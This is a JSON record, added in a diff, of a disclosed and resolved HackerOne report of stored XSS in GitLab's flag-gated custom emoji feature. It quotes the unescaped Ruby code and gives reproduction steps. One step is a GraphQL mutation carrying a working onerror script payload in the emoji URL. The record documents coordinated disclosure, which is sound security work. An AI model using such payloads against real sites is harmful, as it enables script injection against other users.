@@ -1,0 +1,139 @@
+{
+  "id": 1198517,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTk4NTE3",
+  "url": "https://hackerone.com/reports/1198517",
+  "title": "Stored XSS in custom emoji",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-05-15T20:12:45.283Z",
+  "submitted_at": "2021-05-15T20:12:45.437Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-07-19T13:06:59.010Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-27T12:45:24.171Z",
+  "team_member_agreed_on_going_public_at": "2021-07-19T13:06:58.862Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nI found Stored XSS with a feature of custom emoji.\n\nThis feature hasn't been rolled out yet and need to set feature flags in self management installation. ( https://gitlab.com/gitlab-org/gitlab/-/issues/231317 )\n\n\nThe problem is the code here.\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.11.4-ee/lib/gitlab/emoji.rb#L43\n\n```ruby\n    def emoji_image_tag(name, src)\n      \"<img class='emoji' title=':#{name}:' alt=':#{name}:' src='#{src}' height='20' width='20' align='absmiddle' />\"\n    end\n\n    ...\n\n    def custom_emoji_tag(name, image_source)\n      data = {\n        name: name\n      }\n\n      ActionController::Base.helpers.content_tag('gl-emoji', title: name, data: data) do\n        emoji_image_tag(name, image_source).html_safe\n      end\n    end\n```\n\nSince the `src` value of `emoji_image_tag` is not escaped, it will be XSS.\n(The value of `name` is not available for XSS as validation exists.)\n\n### Steps to reproduce\n\nThe following steps should to be reproduced in a self-managed installation of gitlab.\n\n 1. Set feature_flag\n\nsee https://docs.gitlab.com/ee/administration/feature_flags.html\n\n```\n# gitlab-rails console\n--------------------------------------------------------------------------------\n Ruby:         ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]\n GitLab:       13.11.3 (b321336e443) FOSS\n GitLab Shell: 13.17.0\n PostgreSQL:   12.6\n--------------------------------------------------------------------------------\nLoading production environment (Rails 6.0.3.6)\nirb(main):001:0> Feature.enable(:custom_emoji)\n=> true\n```\n\n\n 2. Create group\n\nCreate a group to set the custom emoji. For example, `xss_target`.\n\n\n 3. Create custom emoji\n\nThe ability to create custom emoji only exists in graphql api.\n\nCreate by sending the following query from the graphiql page of `https://localhost/-/graphql-explorer`.\n\n```\nmutation {\n  createCustomEmoji(input: \n    {\n      groupPath: \"xss_target\", \n      name:\"xssreplace\",\n      url:\"http://aaa#'><img onerror=alert(location) src=.>\"\n    }) {\n    customEmoji {\n      id\n      name\n      url\n    }\n  }\n}\n```\n\n{F1302828}\n\n 4. Create project and file\n\nCreate a project to display custom emojis and create a `README.md` with the following content.\n\n```\n:xssreplace:\n```\n\n\n5. View rendering results in browser\n\nThe function of custom emoji replaces the `:xssreplace:` part to become Stored XSS.\n\n### Impact\n\nStored XSS is possible with gitlab with feature flags set.\n\n### Examples\n\nThere is no example because it works only with gitlab with feature flag set.\n\n### What is the current *bug* behavior?\n\nInsufficient escape of `src`.\n\n### What is the expected *correct* behavior?\n\nEscape the value of `src`.\n\n### Relevant logs and/or screenshots\n\n{F1302824}\n\n### Output of checks\n\nGitLab.com doesn't have a feature flag set so it doesn't affect.\n\n#### Results of GitLab environment info\n\n```\n# gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.2p137\nGem Version:\t3.1.4\nBundler Version:2.1.4\nRake Version:\t13.0.3\nRedis Version:\t6.0.12\nGit Version:\t2.31.1\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.11.3\nRevision:\tb321336e443\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.6\nURL:\t\thttps://gitlab.example.com\nHTTP Clone URL:\thttps://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t13.17.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nStored XSS is possible with gitlab with feature flags set.",
+  "bounty_amount": "3000.0",
+  "formatted_bounty": "$3,000",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1302824,
+      "file_name": "custom_emoji_xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uu2zrxl3kbpuqj36odcqpcvh2mzm?response-content-disposition=attachment%3B%20filename%3D%22custom_emoji_xss.png%22%3B%20filename%2A%3DUTF-8%27%27custom_emoji_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVETB6NTJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T021611Z&X-Amz-Expires=1962&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCYnko1tMVzQaQ44fz7rO80zexmhh2%2FLqdPjZ4gDJjHTAIgdorI8tGUcvQvsAKCxGLcjr9sd%2BJ026hdb1p84pF%2B18YqugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIHUt0Xxh8Fh3tz0GSqOBUppGn7A3c4oWm7vMmwVvkuUj3TQgXMso%2FSyeExTvBTlGRRlCy5e6oM6JaJtD8ezJoCN6jrY7TXJ7BG9Z%2Fs%2FRnPXME39pzTlppIPJug6ByZ%2FTfrU0ubZ%2Fc91w99L8rB4kqHpjhA6YRj7uVEb3RjExDPIyvf%2BuNeiQS9nt%2FNqghxB4YHGB0EA3vavAII%2FKBJOR9um91KYYvacIabStfej44EZO9EvkVO04%2Bt26s3nYDk5rdQpHWOAZI8eUkYXRkNMneVhVOJzj9qm8uZNM73T1TTk6tX6Nw4XqGpJPK1tW38IY1qfUS9ycwY%2Bn410n28iaQfvCr5Uddd9apL5K%2Bw3v3kxMvd2QzfepYbT5bJE6Rpej%2BfRxg5cDr%2B16u9sOYVmoge9AteGT5QtBxvBsyDOFleNLD42RyUXnGtlbiPe5XdtlTswhnHl8VDlWfczQ%2FMHtuybt1teIudbnaIFR0TV%2B3h1jzykB2m4qkDfMyQwM6mqIc6aLlqpKV0cbnDfWbj4I8FhoJt2HwVbZJGFNYdj2dBJi7ApQkDgJIUXcbY5cT7pXZK6kU4Tm9m%2BuI%2Br8uW27MvE1AefLtWvZqGZIGERkT9kPN6dH5jaWlg9%2B%2FfM5mH6op%2Fkc%2B3j6HwNc%2BZWWQWaao3WDXM5Vp3%2FxOLeSyczFkRTiQQyeEeT1K8G5mRpTBOerlt2npzMWSF5o5o%2B0jlp9EhmBfRIHwn3Rl%2FNJYllugDGRrAvamtsk2ecMfchFXEaaOI7KaIynC2Jm0cTpjx2MXdfXB%2F9kakgXPgvkLBnhBt4PIEiiUI1hozbLzmZDcNyAykwM%2BQbh5wq5RwXemft1m3Y2fxp8pMsqXYHcuakmekzsjeFNON7zS3Yz1jiKjDUpbzGBjqxAQ1mXx%2Fmv4lCG9meklEB9YnHcqq5vuyXfLgnZI6zGjXvmgoQBRLHlWST%2F0k9ddAF2Yv7FQ0RbL6JgRcSaO5uI%2BmvaCY%2BE0PB9FSN27w%2FHgnHB1vM%2BGT5%2ByGxGPxyY2I%2Fb%2BiBEmEf3VZG0axRZ5tINJZDjkSkTWdPPAQnB%2BnAvi5ywcvTxVdxSU9jk20mJ0awmb6z9AnfkVscGPkg1KCZZ54nRsl%2F2uDcxL6s4iPU%2FtvI9A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ec8cfd41ce2c05c40464c1b02d44e6807cf31f1535a20e87e8b923be7708fc20",
+      "file_size": 601668,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1302828,
+      "file_name": "graphql.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t2mdzeskto9otmzhd090fewakcag?response-content-disposition=attachment%3B%20filename%3D%22graphql.png%22%3B%20filename%2A%3DUTF-8%27%27graphql.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVETB6NTJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T021611Z&X-Amz-Expires=1962&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCYnko1tMVzQaQ44fz7rO80zexmhh2%2FLqdPjZ4gDJjHTAIgdorI8tGUcvQvsAKCxGLcjr9sd%2BJ026hdb1p84pF%2B18YqugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIHUt0Xxh8Fh3tz0GSqOBUppGn7A3c4oWm7vMmwVvkuUj3TQgXMso%2FSyeExTvBTlGRRlCy5e6oM6JaJtD8ezJoCN6jrY7TXJ7BG9Z%2Fs%2FRnPXME39pzTlppIPJug6ByZ%2FTfrU0ubZ%2Fc91w99L8rB4kqHpjhA6YRj7uVEb3RjExDPIyvf%2BuNeiQS9nt%2FNqghxB4YHGB0EA3vavAII%2FKBJOR9um91KYYvacIabStfej44EZO9EvkVO04%2Bt26s3nYDk5rdQpHWOAZI8eUkYXRkNMneVhVOJzj9qm8uZNM73T1TTk6tX6Nw4XqGpJPK1tW38IY1qfUS9ycwY%2Bn410n28iaQfvCr5Uddd9apL5K%2Bw3v3kxMvd2QzfepYbT5bJE6Rpej%2BfRxg5cDr%2B16u9sOYVmoge9AteGT5QtBxvBsyDOFleNLD42RyUXnGtlbiPe5XdtlTswhnHl8VDlWfczQ%2FMHtuybt1teIudbnaIFR0TV%2B3h1jzykB2m4qkDfMyQwM6mqIc6aLlqpKV0cbnDfWbj4I8FhoJt2HwVbZJGFNYdj2dBJi7ApQkDgJIUXcbY5cT7pXZK6kU4Tm9m%2BuI%2Br8uW27MvE1AefLtWvZqGZIGERkT9kPN6dH5jaWlg9%2B%2FfM5mH6op%2Fkc%2B3j6HwNc%2BZWWQWaao3WDXM5Vp3%2FxOLeSyczFkRTiQQyeEeT1K8G5mRpTBOerlt2npzMWSF5o5o%2B0jlp9EhmBfRIHwn3Rl%2FNJYllugDGRrAvamtsk2ecMfchFXEaaOI7KaIynC2Jm0cTpjx2MXdfXB%2F9kakgXPgvkLBnhBt4PIEiiUI1hozbLzmZDcNyAykwM%2BQbh5wq5RwXemft1m3Y2fxp8pMsqXYHcuakmekzsjeFNON7zS3Yz1jiKjDUpbzGBjqxAQ1mXx%2Fmv4lCG9meklEB9YnHcqq5vuyXfLgnZI6zGjXvmgoQBRLHlWST%2F0k9ddAF2Yv7FQ0RbL6JgRcSaO5uI%2BmvaCY%2BE0PB9FSN27w%2FHgnHB1vM%2BGT5%2ByGxGPxyY2I%2Fb%2BiBEmEf3VZG0axRZ5tINJZDjkSkTWdPPAQnB%2BnAvi5ywcvTxVdxSU9jk20mJ0awmb6z9AnfkVscGPkg1KCZZ54nRsl%2F2uDcxL6s4iPU%2FtvI9A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0f4e48bd720ad8134f65ce5e690490dc31426fb59038c94ee9a2770131dee106",
+      "file_size": 622443,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 127,
+  "voters": [
+    "bncrypted",
+    "theranger",
+    "lvmalware",
+    "dninjadave",
+    "baldev123",
+    "joaxcar",
+    "rootz491",
+    "arw9234",
+    "menicas",
+    "bloody_eye",
+    "and 117 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 55897,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://gitlab.com/gitlab-org/gitlab",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
